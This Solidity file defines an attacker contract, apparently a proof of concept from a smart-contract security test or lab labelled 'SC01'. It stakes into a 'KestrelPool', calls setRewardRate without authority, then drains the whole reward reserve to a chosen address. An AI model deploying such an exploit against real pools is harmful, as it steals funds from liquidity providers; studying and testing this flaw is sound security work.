// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { KestrelPool } from "kestrel/KestrelPool.sol";

/// @notice SC01 attacker: takes a small LP position, raises the reward emission rate it has
///         no authority over, waits, and claims the whole reward reserve.
contract RewardRateAttacker {
    /// @notice Target pool.
    KestrelPool public immutable pool;

    /// @param _pool Target pool.
    constructor(KestrelPool _pool) {
        pool = _pool;
    }

    /// @notice Join the pool with tokens this contract holds.
    /// @param amount0 token0 to deposit.
    /// @param amount1 token1 to deposit.
    function stake(uint256 amount0, uint256 amount1) external {
        pool.token0().approve(address(pool), amount0);
        pool.token1().approve(address(pool), amount1);
        pool.addLiquidity(amount0, amount1, address(this));
    }

    /// @notice Set the emission rate (without authority) to `rate`.
    /// @param rate Reward tokens per second.
    function crank(uint256 rate) external {
        pool.setRewardRate(rate);
    }

    /// @notice Claim the accrued rewards and forward them to `to`.
    /// @param to Profit recipient.
    /// @return amount Reward tokens extracted.
    function harvest(address to) external returns (uint256 amount) {
        amount = pool.claimReward();
        IERC20(address(pool.rewardToken())).transfer(to, amount);
    }
}
